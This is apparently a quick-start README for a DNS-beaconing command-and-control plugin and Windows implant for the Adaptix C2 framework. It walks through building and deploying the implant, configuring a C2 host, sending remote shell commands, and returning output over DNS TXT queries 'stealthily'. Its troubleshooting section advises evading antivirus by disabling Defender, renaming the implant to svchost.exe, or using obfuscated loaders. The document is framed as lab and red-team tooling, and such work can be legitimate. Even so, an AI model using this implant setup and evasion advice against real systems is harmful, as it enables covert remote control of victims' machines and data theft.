# Quick Start — 15 Minutes to Working C2

Follow this to get the DNS beacon running in your lab.

## Prerequisites

- Adaptix C2 v1.2.0 installed and running
- Go 1.25+ installed
- x86_64-w64-mingw32-gcc (for Windows implant)
- This repo cloned locally

**Verify tools:**
```bash
go version        # should be 1.25+
which x86_64-w64-mingw32-gcc
# If missing: sudo apt install mingw-w64 on Kali
```

## Step 1: Build Everything (3 min)

From this repo root:

```bash
cd listener && make
cd ../agent && make
cd ../payload && make
```

Expected output:
```
listener/
    * Building BeaconDNS listener plugin
      done...

agent/
    * Building dns_agent plugin
      done...

payload/
    * Building dns_agent.exe implant
      done...
```

Check for compiled files:
```bash
ls -lh listener/dist/BeaconDNS.so \
        agent/dist/dns_agent.so \
        payload/dns_agent.exe
```

All three should exist and be non-zero size.

## Step 2: Deploy to Adaptix (2 min)

Find your Adaptix installation:

```bash
# Locate Adaptix server directory
ADAPTIX_DIR=$(find ~ -name "adaptixserver" -type f 2>/dev/null | head -1 | xargs dirname)
echo "Adaptix found at: $ADAPTIX_DIR"

# If not found, specify manually:
ADAPTIX_DIR="/path/to/AdaptixC2/AdaptixServer/server-dist"
```

Deploy files:

```bash
ADAPTIX_DIR="<your_adaptix_server_dist_path>"

# Copy listener files
sudo mkdir -p "$ADAPTIX_DIR/extenders/BeaconDNS"
sudo cp listener/dist/BeaconDNS.so "$ADAPTIX_DIR/extenders/BeaconDNS/"
sudo cp listener/dist/config.yaml "$ADAPTIX_DIR/extenders/BeaconDNS/"
sudo cp listener/dist/ax_config.axs "$ADAPTIX_DIR/extenders/BeaconDNS/"

# Copy agent files
sudo mkdir -p "$ADAPTIX_DIR/extenders/dns_agent"
sudo cp agent/dist/dns_agent.so "$ADAPTIX_DIR/extenders/dns_agent/"
sudo cp agent/dist/config.yaml "$ADAPTIX_DIR/extenders/dns_agent/"
sudo cp agent/dist/ax_config.axs "$ADAPTIX_DIR/extenders/dns_agent/"
```

## Step 3: Restart Adaptix Server (2 min)

```bash
# Kill running instance
sudo pkill -f adaptixserver
sleep 2

# Find and restart
ADAPTIX_DIR="<your_adaptix_server_dist_path>"
cd "$ADAPTIX_DIR"
sudo ./adaptixserver -profile profile.yaml
```

**Watch for clean startup:**
```
[===== Adaptix Framework v1.2 =====]
[+] Starting server -> https://0.0.0.0:4321/endpoint
[*] Restore data from Database...
   [+] Restored N agents
[+] The AdaptixC2 server is ready
```

**Check for plugin load errors:**
```bash
# In another terminal:
sudo tail -f /path/to/adaptix/logs | grep -E "(BeaconDNS|dns_agent)"
# Should see [+] for both, no [-] errors
```

## Step 4: Create DNSC2 Listener (2 min)

1. **Get your Kali IP:**
   ```bash
   # Find your listening IP
   ip addr show | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1
   # Or ask Adaptix which IP it's listening on
   ```

2. Open Adaptix Client: https://YOUR_KALI_IP:4321/endpoint (replace YOUR_KALI_IP)

3. **Listeners** tab → **Create Listener**

4. Fill in:
   ```
   Type:   DNSC2 (dropdown)
   Name:   DNS Beacon Lab
   Host:   0.0.0.0 (listen on all interfaces)
   Port:   5300 (or any available port)
   Domain: c2.lab (or any domain you want)
   ```

5. Click **Create**

Listener should start immediately. Verify port is listening:

```bash
LISTENER_PORT=5300
sudo netstat -ulnp | grep $LISTENER_PORT
# Should show: udp  0  0  0.0.0.0:5300  0.0.0.0:*  adaptixserver
```

## Step 5: Run Implant on Windows (2 min)

Copy `payload/dns_agent.exe` to your Windows VM (or lab target):

```
C:\> dns_agent.exe
```

No visible output — it runs silently in background.

## Step 6: Verify Registration (2 min)

Back in Adaptix Client:

1. **Sessions** tab
2. You should see one agent with:
   - ID: deadc0de (hardcoded in lab config.h)
   - Hostname: [your Windows hostname]
   - User: [Windows username]

If nothing appears, wait 10 seconds and refresh. Agent appears within SLEEP_MS (5s default) + jitter.

## Step 7: Task & Execute (2 min)

1. Right-click agent → **Interact**
2. Type commands:

```
> shell whoami
> shell ipconfig
> shell systeminfo
> shell dir C:\
```

Output appears in console within ~5 seconds.

## Step 8: Test BOF Execution (Optional)

If you have a BOF (.o file):

```
> execute-bof /path/to/whoami.o
```

Output logged with [BOF] prefix.

## Verify End-to-End Communication

**On the Kali server, monitor DNS queries:**

```bash
# Monitor on your listener port
LISTENER_PORT=5300
sudo tcpdump -i any -n "udp port $LISTENER_PORT" -A

# You'll see raw DNS TXT queries like:
# MFRA.ABCD.EFGH.deadc0de.c2.lab TXT
# └─────────────────┬──────────────┘
#   base32(XOR(data))
```

If you don't see queries:
- Check implant is running on target
- Check firewall isn't blocking port
- Verify C2_HOST in config.h matches your Kali IP

**On the implant:**

Just runs silently. No console output. Check Windows Event Viewer if needed.

## Troubleshooting

### Plugin fails to load (BeaconDNS)

**Error:** `failed to open plugin BeaconDNS.so: plugin was built with a different version of...`

**Cause:** Build ID mismatch between server binary and .so files.

**Fix:**
```bash
# These builds are standalone (not tied to Adaptix server binary).
# Clean and rebuild both plugins.
cd listener && make clean && make
cd ../agent && make clean && make
# Redeploy to server-dist/
```

### Agent doesn't register

**Symptom:** No agent appears in Sessions tab after 30 seconds.

**Cause:** Listener not running, or implant can't reach Kali.

**Checks:**
1. Verify listener is active in GUI (Listeners tab)
2. Verify port 5300 is open:
   ```bash
   sudo netstat -ulnp | grep 5300
   ```
3. From Windows target, ping Kali (IP connectivity):
   ```cmd
   C:\> ping 192.168.67.128
   ```
4. Watch server logs:
   ```bash
   sudo tail -f /path/to/adaptix/server.log | grep -i beacon
   ```

### Output truncated

**Symptom:** Large command output cuts off.

**Cause:** Multi-chunk reassembly (normal for large outputs).

**Expected:** Implant sends chunks, listener reconstructs. Monitor console for "reassembled" messages. Takes a few heartbeats for large outputs.

### Port 5300 already in use

```bash
sudo lsof -i :5300
sudo pkill -f <process using 5300>
```

### Implant exits immediately

**Cause:** Windows Defender or antivirus blocking it.

**Options:**
- Disable antivirus (lab only)
- Add implant to whitelist
- Rename implant (svchost.exe, etc.)
- Use loader/obfuscation (advanced)

## What Just Happened

1. **Implant registered** → sent heartbeat with hostname, user, PID, arch
2. **Listener parsed** → extracted data from DNS TXT query
3. **Agent created** → Adaptix created new session
4. **Tasking** → you sent shell command via GUI
5. **Implant executed** → ran cmd.exe /c whoami
6. **Output returned** → sent via DNS TXT in next heartbeat
7. **Console logged** → appeared in Adaptix GUI

All over DNS TXT queries. No persistent connection. Stealth by design.

## Next Steps

- **Real deployment?** See [ENGAGEMENT.md](docs/ENGAGEMENT.md)
- **Understand the protocol?** See [PROTOCOL.md](docs/PROTOCOL.md)
- **Configure for your setup?** See [ADAPTIX_CONFIG.md](docs/ADAPTIX_CONFIG.md)
- **Technical details?** See [ARCHITECTURE.md](docs/ARCHITECTURE.md)

## Common Tasks

### Rebuild after code changes

```bash
# If you edited listener Go code:
cd listener && make clean && make
# Redeploy to server-dist/, restart server

# If you edited implant C code:
cd payload && make clean && make
# Deploy new exe to target, run it

# If you edited agent Go code:
cd agent && make clean && make
# Redeploy, restart server
```

### Change implant config (lab)

Edit `payload/include/config.h`:

```c
#define C2_HOST    "YOUR_KALI_IP"     // Your Kali server IP (not 127.0.0.1)
#define C2_PORT    5300               // Must match listener port (default 5300)
#define C2_DOMAIN  "c2.lab"           // Must match listener domain
#define AGENT_ID   "deadc0de"         // Unique 8 hex chars (change per engagement)
#define SLEEP_MS   5000               // Heartbeat interval (lab: 5s, ops: 60s+)
#define JITTER_PCT 20                 // Randomize by ±20%
```

**Find your Kali IP:**
```bash
# Option 1: Get IP from interface
ip addr show | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -1

# Option 2: Ask Adaptix what IP it's bound to
# (check server startup output or netstat -tlnp)
```

Then rebuild:
```bash
cd payload && make
# New dns_agent.exe ready
```

### Monitor server logs

```bash
cd /home/kali/AdaptixC2/AdaptixServer/server-dist
sudo tail -f server.log | grep -i dns
```

### List active agents programmatically

Query the Adaptix API (if enabled). For lab, use GUI Sessions tab.

## Support

- **Build issues?** Check prerequisites (Go 1.25+, mingw-w64)
- **Plugin load errors?** Rebuild both plugins together from clean state
- **No registration?** Verify listener exists in GUI + port 5300 is bound
- **More details?** See docs/ folder

Good luck. Happy beaconing. 🚀
